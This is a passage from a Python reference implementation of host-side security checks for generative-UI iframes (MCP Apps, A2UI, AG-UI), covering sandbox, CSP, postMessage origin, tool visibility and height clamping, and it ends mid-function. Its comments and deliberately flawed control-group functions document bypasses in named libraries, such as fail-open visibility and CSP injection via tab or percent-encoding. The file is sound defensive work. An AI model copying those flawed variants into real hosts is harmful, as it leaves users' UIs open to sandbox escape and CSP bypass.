r"""L16x 的参考实现：生成式 UI 宿主这一侧的协议与信任判定。shared/genui.ts 的 Python 镜像。

九组纯函数，零 DOM、零 I/O、零模型：可见性、宿主桥、出站时序、消息来源、CSP 与 allow、沙箱、
尺寸、原子 JSON Patch、A2UI 树与目录，以及「从 iframe 通往模型上下文」的两条路。
危险全在「给定一条消息 / 一棵树 / 一个属性字符串，它能不能过」——这一层能确定性地测，一次模型都不用调。
每条规则旁边用 ★ 标出那个「看起来对、实际错」的写法；verify 就拿那些写法去敲门。

口径：MCP Apps 稳定版 2026-01-26、A2UI v0.9.1（v1.0 候选的条目单独标出）、AG-UI 1.0。

─── Python 侧的差异 ───────────────────────────────────────────

天然就对的：
  · find / 切片只在 ASCII 字符（: / ? # @ ~ %）处切：UTF-16 下标和码点下标不同，切出来的子串相同。
  · list.insert(k, v) 在 k 超过长度时追加到末尾，和 splice(k, 0, v) 一样——朴素 applier 的「静默追加」靠它。
  · dict 保插入序；JS 的 delete 就是 del，重新加回来的键两边都排到最后。

反而要小心的：
  · bool 是 int 的子类：json_type、clamp_height 里先判 bool；`True == 1`、`1 == 1.0` 都成立，test 不能用 ==。
  · 缺键和 null 是两回事：hasOwn(op, 'value') 写成 'value' in op，不写 op.get('value') is None。
  · `??` 一律写成 is None 判断，不写 or：{}、[]、0、"" 在 Python 里都是假值。
  · 正则用 re.fullmatch，不用 ^…$（$ 还匹配末尾换行之前），也不用 \d \s \w。
  · 小写只动 ASCII（ascii_lower），按 ASCII 空白切（split_ascii_ws）；不用 str.lower()、无参的 str.split()。
  · JSON.stringify 自己写（json_stringify）：1.0 打成 1、NaN 打成 null、小数按 JS 的 Number::toString 摆，
    数组下标样的键（"0"、"7"）按 JS 的规矩排在对象最前面。dataclass 按字段展开，字段名换回 TS 的驼峰。
  · 没有原型链：TS 里 `catalog.functions['constructor']` 会摸到 Object.prototype 上的东西，所以 TS 版查目录一律走
    own()（Object.hasOwn）；Python 的 dict 本来就查不到，用 in / .get 即可。verify T6、A3 两边都测这类键。
"""

from __future__ import annotations

import json
import math
import re
from dataclasses import dataclass, fields, is_dataclass
from typing import Any, Literal, TypedDict, cast

_ARRAY_INDEX_KEY = re.compile(r"(?:0|[1-9][0-9]*)")


def _is_index_key(k: object) -> bool:
    return isinstance(k, str) and _ARRAY_INDEX_KEY.fullmatch(k) is not None and int(k) < 4294967295


def js_keys(o: dict[str, Any]) -> list[str]:
    """Object.keys 的顺序：数组下标样的键（"0" … "4294967294"）按数值升序排最前，其余保插入序。"""
    idx = [k for k in o if _is_index_key(k)]
    if not idx:
        return list(o)
    return sorted(idx, key=int) + [k for k in o if not _is_index_key(k)]


def js_number(x: float) -> str:
    """String(x)：ECMAScript 的 Number::toString。

    repr 给出的最短有效数字两边相同，只是摆法不同：Python 写 1e-05、1e-07、1.0，JS 写 0.00001、1e-7、1。
    """
    if isinstance(x, int) and not isinstance(x, bool):
        return str(x)
    if math.isnan(x):
        return "NaN"
    if math.isinf(x):
        return "Infinity" if x > 0 else "-Infinity"
    if x == 0:
        return "0"
    sign = "-" if x < 0 else ""
    mant, _, exp = repr(abs(x)).partition("e")
    ip, _, fp = mant.partition(".")
    raw = (ip + fp).lstrip("0")
    digits = raw.rstrip("0")
    k = len(digits)
    # 值 = 0.digits × 10^n
    n = k + (int(exp) if exp else 0) - len(fp) + (len(raw) - k)
    if k <= n <= 21:
        s = digits + "0" * (n - k)
    elif 0 < n <= 21:
        s = digits[:n] + "." + digits[n:]
    elif -6 < n <= 0:
        s = "0." + "0" * (-n) + digits
    else:
        e = n - 1
        head = digits if k == 1 else digits[0] + "." + digits[1:]
        s = f"{head}e{'+' if e >= 0 else '-'}{abs(e)}"
    return sign + s


def _camel(k: str) -> str:
    head, *rest = k.split("_")
    return head + "".join(w[:1].upper() + w[1:] for w in rest)


def json_stringify(x: Any) -> str:
    """JSON.stringify(x)。dataclass 按字段展开、字段名换回 TS 的驼峰，失败信息和 TS 一字不差。"""
    if x is None:
        return "null"
    if x is True:
        return "true"
    if x is False:
        return "false"
    if isinstance(x, int):
        return str(x)
    if isinstance(x, float):
        return js_number(x) if math.isfinite(x) else "null"
    if isinstance(x, str):
        return json.dumps(x, ensure_ascii=False)
    if isinstance(x, list | tuple):
        return "[" + ",".join(json_stringify(v) for v in x) + "]"
    if isinstance(x, dict):
        items = (f"{json.dumps(k, ensure_ascii=False)}:{json_stringify(x[k])}" for k in js_keys(x))
        return "{" + ",".join(items) + "}"
    if is_dataclass(x) and not isinstance(x, type):
        items = (f'"{_camel(f.name)}":{json_stringify(getattr(x, f.name))}' for f in fields(x))
        return "{" + ",".join(items) + "}"
    raise TypeError(f"不是 JSON 值：{type(x).__name__}")


J = json_stringify


@dataclass(frozen=True)
class Decision:
    allow: bool
    reason: str


def _allow() -> Decision:
    return Decision(allow=True, reason="ok")


def _deny(reason: str) -> Decision:
    return Decision(allow=False, reason=reason)


def ascii_lower(s: str) -> str:
    return "".join(chr(ord(c) + 32) if "A" <= c <= "Z" else c for c in s)


# HTML 的 ASCII 空白：sandbox 属性、CSP source list、Permissions Policy 都按它切。
ASCII_WS = [" ", "\t", "\n", "\r", "\f"]


def split_ascii_ws(s: str) -> list[str]:
    out: list[str] = []
    cur = ""
    for c in s:
        if c in ASCII_WS:
            if cur != "":
                out.append(cur)
            cur = ""
        else:
            cur += c
    if cur != "":
        out.append(cur)
    return out


def _trim_ascii_ws(s: str) -> str:
    a = 0
    b = len(s)
    while a < b and s[a] in ASCII_WS:
        a += 1
    while b > a and s[b - 1] in ASCII_WS:
        b -= 1
    return s[a:b]


def origin_of(u: str) -> str:
    """scheme://host[:port]，host 小写、默认端口去掉。不用 URL / urllib：两种语言对畸形输入的处理不一样。"""
    i = u.find("://")
    if i < 0:
        return "null"
    scheme = ascii_lower(u[:i])
    rest = u[i + 3 :]
    cut = len(rest)
    for c in ["/", "?", "#"]:
        k = rest.find(c)
        if k >= 0 and k < cut:
            cut = k
    rest = rest[:cut]
    at = rest.rfind("@")
    if at >= 0:
        rest = rest[at + 1 :]
    host = ascii_lower(rest)
    if (scheme == "https" and host.endswith(":443")) or (scheme == "http" and host.endswith(":80")):
        host = host[: host.rfind(":")]
    return f"{scheme}://{host}"


# ─────────────────────────────────────────────────────────────
# 一、可见性：两个方向（§2.3、§2.4、§10.1）
# ─────────────────────────────────────────────────────────────

Vis = Literal["model", "app"]
DEFAULT_VISIBILITY: list[Vis] = ["model", "app"]


@dataclass(frozen=True)
class VisParse:
    ok: bool
    # 没写 visibility（JSON 里缺这个键或是 null）。
    omitted: bool
    list: list[Vis]
    reason: str


def parse_visibility(v: Any) -> VisParse:
    """`_meta.ui.visibility` 的解析。规范类型是 `Array<"model" | "app">`，省略时默认 `["model","app"]`。
    ★ 必须先判是不是数组：字符串 "app" 也有 `.includes("app")`，@ai-sdk/mcp 就因此把它判成 app 可见（实测 T1）。
    """
    if v is None:
        return VisParse(ok=True, omitted=True, list=[*DEFAULT_VISIBILITY], reason="")
    if not isinstance(v, list):
        return VisParse(ok=False, omitted=False, list=[], reason="not-an-array")
    out: list[Vis] = []
    for x in v:
        if x != "model" and x != "app":
            return VisParse(ok=False, omitted=False, list=[], reason=f"unknown-entry:{J(x)}")
        if x not in out:
            out.append(x)
    return VisParse(ok=True, omitted=False, list=out, reason="")


def spec_model_visible(v: Any) -> bool:
    """规范语义：省略 = 双方可见；判据是 includes，不是「长度为 1 且等于」。"""
    p = parse_visibility(v)
    return p.ok and "model" in p.list


def spec_app_visible(v: Any) -> bool:
    p = parse_visibility(v)
    return p.ok and "app" in p.list


def basic_host_model_visible(v: Any) -> bool:
    """官方 basic-host 的「给模型列工具」：解析失败也当可见（fail-open）。"""
    p = parse_visibility(v)
    return not p.ok or "model" in p.list


def ext_apps_app_only(v: Any) -> bool:
    """ext-apps 的 isToolVisibilityAppOnly：`length === 1 && [0] === "app"`。★ `["app","app"]` 判成 false。"""
    return isinstance(v, list) and len(v) == 1 and v[0] == "app"


def ai_sdk_model_visible(v: Any) -> bool:
    """@ai-sdk/mcp 的 splitMCPAppTools：`visibility?.includes(x) === true`。字符串的 includes 是子串匹配。"""
    if v is None:
        return True
    if isinstance(v, list | str):
        return "model" in v
    return False


def ai_sdk_app_visible(v: Any) -> bool:
    if isinstance(v, list | str):
        return "app" in v
    return False


def host_app_may_call(v: Any) -> bool:
    """宿主「给 app 调」这个方向：**显式**写了 app 才放行。省略、解析失败一律拒（fail-closed）。
    ★ 比规范严（规范省略 = app 可调），和 AI SDK 的 deny-by-default 同向：这个方向 fail-open 就是越权。
    """
    p = parse_visibility(v)
    return p.ok and not p.omitted and "app" in p.list


# ─────────────────────────────────────────────────────────────
# 二、宿主桥：View 发来的请求能不能放行（§2.4、§2.5、§6.5、§7.2）
# ─────────────────────────────────────────────────────────────

# 2026-01-26 稳定版里 View 可以发给宿主的方法。
VIEW_METHODS = [
    "ui/initialize",
    "ui/notifications/initialized",
    "ping",
    "tools/call",
    "resources/read",
    "notifications/message",
    "ui/open-link",
    "ui/message",
    "ui/request-display-mode",
    "ui/update-model-context",
    "ui/notifications/size-changed",
]

# AppBridge.connect() 自动转发时额外挂上的方法——不在稳定版列给 View 的消息里（§2.4）。
SDK_AUTOFORWARD_EXTRA = ["resources/list", "resources/templates/list", "prompts/list"]

LINK_SCHEMES = ["https", "http", "mailto"]


@dataclass(frozen=True)
class ToolDef:
    name: str
    server: str
    # 不写和写 null 一样：都是「省略」。
    visibility: Any = None


def tool_def_from_json(d: dict[str, Any]) -> ToolDef:
    """TS 那边 JSON.parse 之后直接当类型用，这里要显式转成 dataclass。"""
    return ToolDef(name=d["name"], server=d["server"], visibility=d.get("visibility"))


# View 发来的 JSON-RPC 请求，原样的 JSON 对象：jsonrpc、id、method、params 都可能缺、可能类型不对。
ViewRequest = dict[str, Any]


@dataclass(frozen=True)
class BridgeCtx:
    # 这个 View 属于哪个 server 连接。
    app_server: str
    # 宿主已知的全部工具（跨所有 server）。
    tools: list[ToolDef]
    methods: list[str] | None = None


def _prop(o: Any, k: str) -> Any:
    """TS 的 `o.k`：o 不是对象时读到 undefined（这里是 None）。"""
    return o.get(k) if isinstance(o, dict) else None


def sdk_auto_forward(msg: ViewRequest) -> Decision:
    """对照组：ext-apps `AppBridge.connect()` 的自动转发。不查可见性、不查 server 归属。"""
    method = msg.get("method")
    if not isinstance(method, str):
        return _deny("bad-shape")
    if method in VIEW_METHODS or method in SDK_AUTOFORWARD_EXTRA:
        return Decision(allow=True, reason="forwarded")
    return _deny("unhandled")


def route_app_request(msg: ViewRequest, ctx: BridgeCtx) -> Decision:
    """TODO 1 的参考实现：一个 View 发起的请求能不能放行。三道闸放在**同一个**函数里：
      方法白名单 → （tools/call）工具属于**这个 View 的 server** → 这个工具显式对 app 可见。
    另外两个方法有参数级的规则：resources/read 只读 ui://；ui/open-link 只放 https / http / mailto。

    ★ 规范把「拒绝」写成宿主的 MUST，SDK 的便捷转发把它留给了宿主自己（§2.4）；AG-UI 中间件只做了 model 方向（§6.5）。
    ★ 跨 server 的判定只能在前端桥里做：后端中间件不知道请求来自哪个 iframe。
    """
    methods = ctx.methods if ctx.methods is not None else VIEW_METHODS
    method = msg.get("method")
    if not isinstance(method, str):
        return _deny("bad-shape")
    if method not in methods:
        return _deny(f"method-not-allowed:{method}")
    p = msg.get("params")
    if p is None:
        p = {}
    if method == "tools/call":
        name = _prop(p, "name")
        if not isinstance(name, str):
            return _deny("bad-shape")
        mine = next((t for t in ctx.tools if t.name == name and t.server == ctx.app_server), None)
        if mine is None:
            other = next((t for t in ctx.tools if t.name == name), None)
            return _deny(
                f"cross-server:{other.server}" if other is not None else f"unknown-tool:{name}"
            )
        if not host_app_may_call(mine.visibility):
            return _deny(f"not-app-visible:{name}")
        return _allow()
    if method == "resources/read":
        uri = _prop(p, "uri")
        if not isinstance(uri, str):
            return _deny("bad-shape")
        if not uri.startswith("ui://"):
            return _deny(f"not-ui-resource:{uri}")
        return _allow()
    if method == "ui/open-link":
        url = _prop(p, "url")
        if not isinstance(url, str):
            return _deny("bad-shape")
        k = url.find(":")
        scheme = ascii_lower(url[:k]) if k > 0 else ""
        if scheme not in LINK_SCHEMES:
            return _deny(f"link-scheme:{scheme}")
        return _allow()
    return _allow()


# ─────────────────────────────────────────────────────────────
# 三、出站时序：宿主 → View（§2.5、§4.1、§7.2）
# ─────────────────────────────────────────────────────────────

OutKind = Literal[
    "tool-input-partial", "tool-input", "tool-result", "tool-cancelled", "host-context-changed"
]


@dataclass(frozen=True)
class Initialized:
    pass


@dataclass(frozen=True)
class ApprovalRequested:
    pass


@dataclass(frozen=True)
class Approval:
    approved: bool


@dataclass(frozen=True)
class Out:
    kind: OutKind
    data: str | None = None


# TS 的 { t: 'initialized' } | { t: 'approval-requested' } | { t: 'approval', approved } | { t: 'out', kind, data? }
HostEvent = Initialized | ApprovalRequested | Approval | Out


@dataclass(frozen=True)
class Outbound:
    # 实际 postMessage 出去的，按发送顺序。
    sent: list[str]
    # 丢弃的：`label:原因`。
    dropped: list[str]
    # 事件流结束时还压着没发的。
    held: list[str]


def out_label(kind: OutKind, data: str | None = None) -> str:
    return f"{kind}({data})" if data is not None else kind


def schedule_outbound(events: list[HostEvent]) -> Outbound:
    """TODO 6 的参考实现：宿主发给 View 的通知该什么时候发。
      - 收到 View 的 `initialized` 之前，什么都不发（MUST NOT），全部压着
      - `tool-input` 最多一次，第二次丢弃（duplicate-tool-input）；它之后再来的 partial 丢弃（partial-after-input）
      - 审批挂起（approval-requested）时，tool-input 和 partial 都不发；批准后放出，拒绝则丢弃（approval-denied）
      - `tool-result` 必须在 tool-input 之后：没发过 input 就压着
      - 其余（cancelled、host-context-changed）准备好了就发
    每次状态变化后从队首重新扫一遍：能发的按队列顺序发，压着的留在原位。

    ★ 工具调用和 iframe 加载是并行的（规范时序图里是 par）：结果可能比 initialized 先到，直接 postMessage 过去要么丢、要么违规。
    ★ 审批前就把入参交给 View「预热」——OpenAI 曾这么做，2026-05-27 改成审批后；AI SDK 在 approval-requested 时不发。
    """
    sent: list[str] = []
    dropped: list[str] = []
    queue: list[tuple[OutKind, str | None]] = []
    ready = False
    gate: Literal["open", "pending", "denied"] = "open"
    input_sent = False

    def verdict(kind: OutKind) -> str:
        """'send' | 'hold' | 丢弃的原因。"""
        if kind == "tool-input" or kind == "tool-input-partial":
            if input_sent:
                return "duplicate-tool-input" if kind == "tool-input" else "partial-after-input"
            if gate == "pending":
                return "hold"
            if gate == "denied":
                return "approval-denied"
            return "send"
        if kind == "tool-result" and not input_sent:
            return "hold"
        return "send"

    def pump() -> None:
        nonlocal input_sent
        if not ready:
            return
        progress = True
        while progress:
            progress = False
            for i, (kind, data) in enumerate(queue):
                v = verdict(kind)
                if v == "hold":
                    continue
                del queue[i]
                progress = True
                if v == "send":
                    sent.append(out_label(kind, data))
                    if kind == "tool-input":
                        input_sent = True
                else:
                    dropped.append(f"{out_label(kind, data)}:{v}")
                break

    for e in events:
        if isinstance(e, Initialized):
            ready = True
        elif isinstance(e, ApprovalRequested):
            gate = "pending"
        elif isinstance(e, Approval):
            gate = "open" if e.approved else "denied"
        else:
            queue.append((e.kind, e.data))
        pump()
    return Outbound(sent=sent, dropped=dropped, held=[out_label(k, d) for k, d in queue])


def naive_outbound(events: list[HostEvent]) -> list[str]:
    """对照组：一产生就 postMessage。"""
    return [out_label(e.kind, e.data) for e in events if isinstance(e, Out)]


# ─────────────────────────────────────────────────────────────
# 四、iframe 的 origin、sandbox 与 postMessage（§3.1–3.3、§10.4）
# ─────────────────────────────────────────────────────────────


@dataclass(frozen=True)
class FrameSpec:
    kind: Literal["srcdoc", "src"]
    src: str | None = None
    # 不写 = 没有 sandbox 属性；空串 = 有属性、零个 token（最严）。
    sandbox: str | None = None


SANDBOX_TOKENS = [
    "allow-downloads",
    "allow-forms",
    "allow-modals",
    "allow-orientation-lock",
    "allow-pointer-lock",
    "allow-popups",
    "allow-popups-to-escape-sandbox",
    "allow-presentation",
    "allow-same-origin",
    "allow-scripts",
    "allow-storage-access-by-user-activation",
    "allow-top-navigation",
    "allow-top-navigation-by-user-activation",
    "allow-top-navigation-to-custom-protocols",
]


def sandbox_tokens(attr: str) -> list[str]:
    """sandbox 属性的 token：按 ASCII 空白切、ASCII 小写、去重。"""
    out: list[str] = []
    for t in split_ascii_ws(attr):
        low = ascii_lower(t)
        if low not in out:
            out.append(low)
    return out


def frame_origin(f: FrameSpec, creator_origin: str) -> str:
    """浏览器给这个 iframe 的文档的 origin（序列化后）。
    ★ srcdoc / about:blank **继承**创建者的 origin（不是 "null"）；只有不含 allow-same-origin 的 sandbox 才变不透明源（实测 origin 组）。
    ★ 所有不透明源都序列化成同一个字符串 "null"。
    """
    if f.sandbox is not None and "allow-same-origin" not in sandbox_tokens(f.sandbox):
        return "null"
    return creator_origin if f.kind == "srcdoc" else origin_of(f.src if f.src is not None else "")


def audit_sandbox(f: FrameSpec, creator_origin: str) -> list[str]:
    """sandbox 属性体检。
    ★ 「allow-scripts + allow-same-origin 等于没沙箱」的前提是**同源**：WHATWG 原文有那个从句，流传时总被删掉。
      跨源嵌入时这组 flag 仍安全（实测 B1 / B1b）。
    """
    if f.sandbox is None:
        return ["no-sandbox-attribute"]
    toks = sandbox_tokens(f.sandbox)
    out: list[str] = []
    real = creator_origin if f.kind == "srcdoc" else origin_of(f.src if f.src is not None else "")
    if "allow-scripts" in toks and "allow-same-origin" in toks and real == creator_origin:
        out.append("escape:same-origin+scripts")
    for t in toks:
        if t.startswith("allow-top-navigation"):
            out.append(f"top-navigation:{t}")
        elif t not in SANDBOX_TOKENS:
            out.append(f"unknown-token:{t}")
    return out


def effective_sandbox(
    initial: str, changed_to: str, via: Literal["document.write", "navigate"]
) -> str:
    """加载之后再改 sandbox 属性：只在**下一次导航**生效。document.write 不是导航（实测 B6）。
    basic-host 的内层正是 document.write 写进去的——宿主后来下发的「更严的 sandbox」在这条路径上不生效。
    """
    return changed_to if via == "navigate" else initial


@dataclass(frozen=True)
class MsgEvent:
    # 发送方窗口的身份。真实代码里是 `event.source === iframe.contentWindow`，这里用一个字符串代替。
    source: str
    origin: str
    data: Any


@dataclass(frozen=True)
class PeerCfg:
    expected_source: str
    # `["*"]` 表示不查 origin（只在对方是不透明源时才该这么配，且 source 照查）。
    allowed_origins: list[str]


def peer_config_errors(cfg: PeerCfg) -> list[str]:
    out: list[str] = []
    if len(cfg.allowed_origins) == 0:
        out.append("empty-allowlist")
    if "null" in cfg.allowed_origins:
        out.append("null-origin-allowlisted")
    if "*" in cfg.allowed_origins and len(cfg.allowed_origins) > 1:
        out.append("wildcard-mixed")
    return out


def is_json_rpc_shape(d: Any) -> bool:
    if not isinstance(d, dict):
        return False
    if d.get("jsonrpc") != "2.0":
        return False
    return isinstance(d.get("method"), str) or "id" in d


def accepts_message(ev: MsgEvent, cfg: PeerCfg) -> Decision:
    """TODO 2 的参考实现（前半）：收 postMessage。依次：配置本身合不合法 → source → origin → 形状。
    ★ 把 "null" 放进白名单 = 接受**任何**沙箱页的消息（所有不透明源都是同一个字符串）。配置错误时一律拒（fail-closed）。
    ★ 只查 origin 不够：生成式 UI 里身份是窗口引用。ext-apps 的默认 transport 曾只查 target 不查 source（commit c7ef5f00）。
    """
    errs = peer_config_errors(cfg)
    if len(errs) > 0:
        return _deny(f"config:{errs[0]}")
    if ev.source != cfg.expected_source:
        return _deny("wrong-source")
    any_ = len(cfg.allowed_origins) == 1 and cfg.allowed_origins[0] == "*"
    if not any_ and ev.origin not in cfg.allowed_origins:
        return _deny(f"wrong-origin:{ev.origin}")
    if not is_json_rpc_shape(ev.data):
        return _deny("bad-shape")
    return _allow()


def safe_target_origin(peer_origin: str) -> str:
    """TODO 2 的参考实现（后半）：发 postMessage 用的 targetOrigin。
    ★ 对不透明源只能用 "*"：`postMessage(msg, "null")` 抛 SyntaxError（实测 B3）。所以敏感数据要少进 View。
    """
    return "*" if peer_origin == "null" else peer_origin


def target_origin_error(t: str) -> str:
    """浏览器对 targetOrigin 的检查（静态模拟）：返回会抛的错误，空串表示合法。"""
    if t == "*" or t == "/":
        return ""
    if origin_of(t) == "null":
        return f"SyntaxError: Invalid target origin '{t}'"
    return ""


# ─────────────────────────────────────────────────────────────
# 五、CSP 与 allow 属性（§2.8、§2.9、§3.5、§8.2、§10.2）
# ─────────────────────────────────────────────────────────────


class CspDecl(TypedDict, total=False):
    """server 声明的 `_meta.ui.csp`，原样的 JSON 对象（键是线上的驼峰名）。值都是不可信的。"""

    connectDomains: Any
    resourceDomains: Any
    frameDomains: Any
    baseUriDomains: Any


CspField = Literal["connectDomains", "resourceDomains", "frameDomains", "baseUriDomains"]


@dataclass(frozen=True)
class SourceCheck:
    ok: bool
    value: str
    reason: str


HEX = "0123456789abcdefABCDEF"


def percent_decode(s: str) -> str:
    """%XX → 字符（只解 ASCII）。"""
    out = ""
    i = 0
    while i < len(s):
        c = s[i]
        if c == "%" and i + 2 < len(s) and s[i + 1] in HEX and s[i + 2] in HEX:
            code = int(s[i + 1 : i + 3], 16)
            if code < 128:
                out += chr(code)
                i += 3
                continue
        out += c
        i += 1
    return out


CSP_SEPARATORS = ['"', "'", "`", ";", ",", *ASCII_WS]


def check_source(raw: Any) -> SourceCheck:
    r"""一个 server 声明的 CSP 源。**先规范化（解码 %XX）再查分隔符**，和 AI SDK 的 sandbox.ts 同一个顺序。
    只收 https: / wss:；拒绝裸 `*` 主机（`*.example.com` 可以）；拒绝 userinfo；路径丢掉，只留 scheme://host[:port]。
    ★ 做字符黑名单删字符会被编码绕过；basic-host 的 `/[;\r\n'" ]/` 没有 tab 和逗号——tab 在 CSP 里同样切分源列表。
    """

    def bad(reason: str) -> SourceCheck:
        return SourceCheck(ok=False, value="", reason=reason)

    if not isinstance(raw, str):
        return bad("not-a-string")
    d = percent_decode(raw)
    for c in d:
        if c in CSP_SEPARATORS:
            return bad("separator")
    i = d.find("://")
    if i < 0:
        return bad("no-scheme")
    scheme = ascii_lower(d[:i])
    if scheme != "https" and scheme != "wss":
        return bad(f"scheme:{scheme}")
    host = d[i + 3 :]
    cut = len(host)
    for c in ["/", "?", "#"]:
        k = host.find(c)
        if k >= 0 and k < cut:
            cut = k
    host = ascii_lower(host[:cut])
    if host == "":
        return bad("empty-host")
    if "@" in host:
        return bad("userinfo")
    colon = host.rfind(":")
    name = host[:colon] if colon >= 0 else host
    wild_ok = name.startswith("*.") and "*" not in name[2:] and len(name) > 2
    if "*" in name and not wild_ok:
        return bad("wildcard-host")
    return SourceCheck(ok=True, value=f"{scheme}://{host}", reason="")


@dataclass(frozen=True)
class CspResult:
    csp: str
    # `字段:原值:原因`。
    rejected: list[str]


def build_csp(decl: CspDecl | None = None) -> CspResult:
    """TODO 3 的参考实现：由 server 声明的域名构造 View 的 CSP。
      - 每个字段：缺省 / null → 空；不是数组 → 整个字段拒；逐条 check_source，通过的去重保序
      - connect-src、frame-src 没有声明时是 'none'（规范的 Restrictive Default），不是 'self'
      - **显式**写 object-src 'none'、base-uri 'none'（没有 baseUriDomains 时）、form-action 'none'

    ★ 不声明 csp 也要返回限制性策略：AI SDK 的 getMCPAppCSP(undefined) 返回 undefined，约束反而比声明 {} 更少（实测 T2）。
    ★ form-action、base-uri 是导航 / 文档指令，**不回退**到 default-src：`default-src 'none'` 关不住表单（实测 E4）。
    ★ 'self' 对一个 srcdoc View 指的是代理文档的源，不是 View 自己——所以 connect-src 默认不给 'self'。
    """
    rejected: list[str] = []

    def field(name: CspField) -> list[str]:
        v = None if decl is None else decl.get(name)
        if v is None:
            return []
        if not isinstance(v, list):
            rejected.append(f"{name}:not-an-array")
            return []
        out: list[str] = []
        for e in v:
            r = check_source(e)
            if not r.ok:
                rejected.append(f"{name}:{J(e)}:{r.reason}")
            elif r.value not in out:
                out.append(r.value)
        return out

    res = field("resourceDomains")
    con = field("connectDomains")
    fr = field("frameDomains")
    base = field("baseUriDomains")

    def sp(xs: list[str]) -> str:
        return " " + " ".join(xs) if len(xs) > 0 else ""

    def or_none(xs: list[str]) -> str:
        return " ".join(xs) if len(xs) > 0 else "'none'"

    csp = "; ".join(
        [
            "default-src 'none'",
            f"script-src 'self' 'unsafe-inline'{sp(res)}",
            f"style-src 'self' 'unsafe-inline'{sp(res)}",
            f"img-src 'self' data:{sp(res)}",
            f"font-src 'self' data:{sp(res)}",
            f"media-src 'self' data:{sp(res)}",
            f"connect-src {or_none(con)}",
            f"frame-src {or_none(fr)}",
            "object-src 'none'",
            f"base-uri {or_none(base)}",
            "form-action 'none'",
        ]
    )
    return CspResult(csp=csp, rejected=rejected)


def csp_directive(csp: str, name: str) -> str | None:
    """一条策略里某个指令的值（不含指令名），没有返回 None。"""
    for part in csp.split(";"):
        toks = split_ascii_ws(part)
        if len(toks) > 0 and ascii_lower(toks[0]) == name:
            return " ".join(toks[1:])
    return None


def _str_list(v: Any) -> list[str]:
    if not isinstance(v, list):
        return []
    return [x for x in v if isinstance(x, str)]


# String.prototype.trimEnd 去的空白：WhiteSpace（含 Zs 类）+ LineTerminator。和 str.rstrip() 的集合不一样。
_JS_WS = frozenset(
    "\t\n\v\f\r \u00a0\u1680\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a"
    "\u2028\u2029\u202f\u205f\u3000\ufeff"
)


def _trim_end(s: str) -> str:
    b = len(s)
    while b > 0 and s[b - 1] in _JS_WS:
        b -= 1
    return s[:b]


def spec_example_connect_src(decl: CspDecl | None = None) -> str:
    """对照组：规范 Security 节示例代码的 connect-src——直接 join(' ')，不做任何校验。"""
    d = [] if decl is None else _str_list(decl.get("connectDomains"))
    return _trim_end(f"connect-src 'self' {' '.join(d)}")


def basic_host_connect_src(decl: CspDecl | None = None) -> str:
    r"""对照组：basic-host 的 sanitizeCspDomains（`/[;\r\n'" ]/`）+ `connect-src 'self' …`。"""
    d = [] if decl is None else _str_list(decl.get("connectDomains"))
    kept = [x for x in d if not any(c in x for c in [";", "\r", "\n", "'", '"', " "])]
    return _trim_end(f"connect-src 'self' {' '.join(kept)}")


# `_meta.ui.permissions` 的键 → Permissions Policy 特性名。
PERMISSION_FEATURES: list[tuple[str, str]] = [
    ("camera", "camera"),
    ("microphone", "microphone"),
    ("geolocation", "geolocation"),
    ("clipboardWrite", "clipboard-write"),
]


def _requested(req: dict[str, Any], k: str) -> bool:
    # 不能用真值判断：请求一个特性的写法是 `camera: {}`，而 {} 在 Python 里是假值。
    return k in req and req[k] is not False and req[k] is not None


def build_allow_attr(req: dict[str, Any], host_allow: list[str] | None = None) -> str:
    """iframe 的 allow 属性：只给 server 请求了、**且**宿主白名单里有的特性；宿主没给白名单 → 什么都不给。用 "; " 连接。
    ★ 规范示例用 join(' ')：`allow="camera microphone"` 被解析成**一条**指令（特性 camera，allowlist 是一个叫 microphone 的源），
      两个都没开（实测 B4）。
    """
    if host_allow is None:
        return ""
    out = [f for k, f in PERMISSION_FEATURES if _requested(req, k) and f in host_allow]
    return "; ".join(out)


def spec_example_allow(req: dict[str, Any]) -> str:
    """对照组：规范 Security 节示例代码（空格连接，且漏了 clipboard-write）。"""
    out = [k for k in ["camera", "microphone", "geolocation"] if _requested(req, k)]
    return " ".join(out)


@dataclass(frozen=True)
class PolicyDirective:
    feature: str
    allowlist: list[str]


def parse_allow_attr(attr: str) -> list[PolicyDirective]:
    """Permissions Policy 的 allow 属性语法：指令之间 `;`，指令内部「特性名 + 空白 + allowlist」。"""
    out: list[PolicyDirective] = []
    for part in attr.split(";"):
        toks = split_ascii_ws(_trim_ascii_ws(part))
        if len(toks) == 0:
            continue
        out.append(PolicyDirective(feature=ascii_lower(toks[0]), allowlist=toks[1:]))
    return out


def delegated_features(attr: str, frame_orig: str) -> list[str]:
    """这个 frame 实际被委派了哪些特性：allowlist 为空（默认 'src'）、含 `*`、`'src'` 或 frame 自己的 origin。"""
    out: list[str] = []
    for d in parse_allow_attr(attr):
        al = d.allowlist
        ok = len(al) == 0 or "*" in al or "'src'" in al or frame_orig in al
        if ok and d.feature not in out:
            out.append(d.feature)
    return out


# ─────────────────────────────────────────────────────────────
# 六、尺寸：一个由不可信方提供的数字（§2.5）
# ─────────────────────────────────────────────────────────────

# basic-host 的 maxHeight。
MAX_VIEW_HEIGHT = 6000


@dataclass(frozen=True)
class Clamped:
    height: int
    note: str


def clamp_height(h: Any, max_height: int = MAX_VIEW_HEIGHT) -> Clamped:
    """View 报上来的高度。★ `height: 1e9` 能把宿主 UI 挤出视口——clickjacking 的素材。"""
    if isinstance(h, bool) or not isinstance(h, int | float):
        return Clamped(height=0, note="rejected:not-a-number")
    if not math.isfinite(h):
        return Clamped(height=0, note="rejected:not-finite")
    if h < 0:
        return Clamped(height=0, note="rejected:negative")
    f = math.floor(h)
    if f > max_height:
        return Clamped(height=max_height, note=f"clamped:{js_number(max_height)}")
    return Clamped(height=f, note="ok")


# ─────────────────────────────────────────────────────────────
# 七、原子 JSON Patch（RFC 6902 / 6901；AG-UI STATE_DELTA）（§6.2、§10.3）
# ─────────────────────────────────────────────────────────────

Json = None | bool | int | float | str | list["Json"] | dict[str, "Json"]
Obj = dict[str, Any]


def _is_obj(x: Any) -> bool:
    return isinstance(x, dict)


def clone_json(x: Json) -> Json:
    return json.loads(json_stringify(x))


def json_type(x: Any) -> str:
    """JSON 类型：null / boolean / number / string / array / object。★ Python 里 bool 是 int 的子类，要先判。"""
    if x is None:
        return "null"
    if isinstance(x, list):
        return "array"
    if isinstance(x, bool):
        return "boolean"
    if isinstance(x, int | float):
        return "number"
    if isinstance(x, str):
        return "string"
    return "object"


def json_type_equal(a: Json, b: Json) -> bool:
